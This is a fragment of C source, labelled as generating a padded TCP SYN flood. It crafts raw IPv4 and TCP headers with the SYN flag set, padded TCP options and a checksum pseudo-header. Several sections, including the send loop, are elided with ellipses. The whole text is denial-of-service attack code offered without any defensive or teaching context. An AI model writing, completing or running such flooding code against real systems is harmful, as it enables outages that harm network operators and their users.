/*
Generate a padded TCP SYN flood
...
int main(int argc, char *argv[]) {
  ...
  char *tcp_ops = (void *)tcph + sizeof(struct tcphdr);
  memset(tcp_ops, 1, OPS_LENGTH * sizeof(char));
  memset(tcp_ops, 0, sizeof(char));
  struct pseudo_header psh;

  // TCP Payload
  data = datagram + sizeof(struct iphdr) + sizeof(struct tcphdr) + OPS_LENGTH;
  strcpy(data, "");
  ...
  iph->version = 4;
  iph->tos = 0;
  iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + OPS_LENGTH + strlen(data);
  ...
  tcph->seq = 0;
  tcph->ack_seq = 0;
  tcph->doff = 5 + (OPS_LENGTH / 4); // TCP Header Size in 32-bit words (5-15)
  tcph->fin=0;
  tcph->syn=1;
  tcph->rst=0;
  tcph->psh=0;
  ...
  psh.tcp_length = htons(sizeof(struct tcphdr) + OPS_LENGTH + strlen(data));

  int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + OPS_LENGTH + strlen(data);
  pseudogram = malloc(psize);

  memcpy(pseudogram, (char*) &psh, sizeof (struct pseudo_header));
  memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr) + OPS_LENGTH + strlen(data));
